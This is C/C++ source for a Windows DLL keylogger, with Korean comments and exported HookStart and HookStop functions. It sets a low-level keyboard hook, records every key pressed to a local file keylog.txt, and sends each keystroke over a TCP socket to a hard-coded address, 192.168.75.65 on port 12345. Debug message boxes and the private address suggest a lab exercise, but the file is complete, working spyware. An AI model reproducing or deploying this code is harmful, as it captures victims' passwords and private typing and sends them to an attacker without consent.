#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
FILE* logFile;

// 서버로 로그 전송 함수
void SendLogToServer(const char* logData) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    int serverPort = 12345;  // 서버 포트 번호 설정

    // Winsock 초기화
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        MessageBoxA(NULL, "WSAStartup failed", "Error", MB_OK);
        return;
    }

    // 소켓 생성
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        MessageBoxA(NULL, "Socket creation failed", "Error", MB_OK);
        WSACleanup();
        return;
    }

    // 서버 주소 설정
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    if (inet_pton(AF_INET, "192.168.75.65", &serverAddr.sin_addr) <= 0) {
        printf("Invalid address/ Address not supported \n");
        return;
    }

    // 서버에 연결
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        MessageBoxA(NULL, "Failed to connect to server", "Error", MB_OK);
        closesocket(sock);
        WSACleanup();
        return;
    }

    // 로그 데이터를 서버로 전송
    send(sock, logData, strlen(logData), 0);

    // 소켓 종료
    closesocket(sock);
    WSACleanup();
}

// DLL 진입점
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        g_hInstance = hinstDLL;
        break;
    case DLL_PROCESS_DETACH:
        if (logFile) {
            fclose(logFile);
        }
        break;
    }
    return TRUE;
}

// 키보드 후킹 프로시저
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {  // 유효한 메시지만 처리
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) {  // 키가 눌릴 때만 처리
            char logData[50];
            snprintf(logData, sizeof(logData), "Key Pressed: %d\n", pKey->vkCode);

            // 파일 기록이 제대로 되는지 확인용 메시지
            MessageBoxA(NULL, logData, "Debug", MB_OK);

            // 로그 파일에 기록
            if (logFile) {
                fprintf(logFile, "%s", logData);
                fflush(logFile);
            }

            // 서버로 로그 전송
            SendLogToServer(logData);
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) void HookStart() {
    fopen_s(&logFile, "keylog.txt", "a");
    if (!logFile) {
        MessageBoxW(NULL, L"Failed to open log file.", L"Error", MB_OK);
        return;
    }

    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, g_hInstance, 0);
    if (!g_hHook) {
        DWORD error = GetLastError();
        wchar_t errorMsg[100];
        swprintf(errorMsg, sizeof(errorMsg) / sizeof(wchar_t), L"Failed to set hook. Error code: %d", error);
        MessageBoxW(NULL, errorMsg, L"Hook Error", MB_OK);
    }
}


extern "C" __declspec(dllexport) void HookStop() {
    if (g_hHook) {
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
    }

    if (logFile) {
        fclose(logFile);
        logFile = NULL;
    }
}